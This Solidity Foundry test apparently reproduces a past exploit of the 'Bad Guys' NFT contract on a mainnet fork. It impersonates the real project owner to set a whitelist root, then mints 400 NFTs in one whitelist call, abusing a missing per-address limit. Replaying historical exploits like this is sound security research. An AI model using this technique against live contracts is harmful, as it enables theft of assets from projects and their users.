// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {MerkleTree} from "../../utils/MerkleTree.sol";
interface IBadGuys {
    function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount) external;
    function flipPauseMinting() external;
    function balanceOf(address owner) external view returns (uint256 balance);
    function setRootHash(bytes32 _updatedRootHash) external;
}

contract Exploit_Bad_Guys_NFT is TestHarness {
    MerkleTreeCreator internal whitelistTree;

    IBadGuys internal constant nft = IBadGuys(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);
    address internal constant project_owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade;
    address internal constant attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;

    function setUp() external {
        cheat.createSelectFork("mainnet", 15453652); // One before setting the merkle root
        
        // Add data to the Whitelist Tree. The data could be bigger. 
        // Adding this contract into the whitelist in an arbitrary position.
        // This data is arbitrary. For the NFT project, it would be an array of multiple addresses.
        bytes32[] memory newData = new bytes32[](5);
        newData[0] = keccak256(abi.encodePacked(address(0x69)));
        newData[1] = keccak256(abi.encodePacked(address(0x77)));
        newData[2] = keccak256(abi.encodePacked(address(this)));
        newData[3] = keccak256(abi.encodePacked(address(0xdeadbeef)));
        newData[4] = keccak256(abi.encodePacked(address(0xdeadbeeeeeeef)));

        // Create the merkle tree with the data
        whitelistTree = new MerkleTreeCreator(newData);
        
        // Supposing that the owner added us to the whitelist merkle tree
        cheat.startPrank(project_owner);
        nft.setRootHash(whitelistTree.root());
        nft.flipPauseMinting();
        cheat.stopPrank();
    }

    function test_attack() external {
        // Getting the proof for this address
        bytes32[] memory merkleProof = whitelistTree.getProofOfData(keccak256(abi.encodePacked(address(this))));

        console.log("Merkle Proofs");
        for(uint i = 0; i < merkleProof.length; i++){
            emit log_bytes32(merkleProof[i]);
        }
        console.log("\n");

        // Here the proper attack begins
        emit log_string("Attacker balance");
        emit log_named_decimal_uint("Before mint", nft.balanceOf(address(this)),0);
        uint256 nftsBefore = nft.balanceOf(address(this));

        nft.WhiteListMint(merkleProof, 400);
        uint256 nftsAfter = nft.balanceOf(address(this));

        emit log_named_decimal_uint("After mint", nft.balanceOf(address(this)), 0);

        assertGe(nftsAfter, nftsBefore);
    }  

    function onERC721Received(
        address /* _operator */,
        address /* _from */,
        uint256 /* _tokenId */,
        bytes memory /* _data */
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
  

}

// Helper contract to handle merkle tree creation
contract MerkleTreeCreator {
    MerkleTree internal merkleTree;
    bytes32[] public treeData;

    bytes32 public root;

    constructor(bytes32[] memory _data) {
        // Create the on chain merkle tree
        root = handleMerkleTreeWhitelist(_data);
    }
    
    // Helper method that enables creating an on chain merkle tree 
    // Usually for whitelists, this is performed off chain.
    function handleMerkleTreeWhitelist(bytes32[] memory data) internal returns(bytes32){
        addTreeData(data);
        merkleTree = new MerkleTree();
        bytes32 merkleRoot = merkleTree.getRoot(data);
        return merkleRoot;
    }

    // Add our data to be included in the tree to the global variable
    function addTreeData(bytes32[] memory _newData) public {
        uint256 dataLength = _newData.length;

        for(uint256 i = 0; i < dataLength; i++ ){
            treeData.push(_newData[i]);
        }
    }      
   
    // Retrieves the proof for a data previously included in the tree.
    function getProofOfData(bytes32 data) public view returns(bytes32[] memory) {
        uint256 node = getNode(data); // Location of the current contract in the treeData
        require(node < type(uint256).max, "node not found");

        bytes32[] memory proof = merkleTree.getProof(treeData, node);

       return proof;
    }

    // Finds the first match of the target data in the tree
   function getNode(bytes32 _target) public view returns(uint256) {
        bytes32[] memory memDataTree = treeData;
        uint256 treeDataLength = treeData.length;
        
        for(uint i = 0; i < treeDataLength; i++){
            if(_target == memDataTree[i]){
                return i;
            }
        }

        return(type(uint256).max);
    }
}
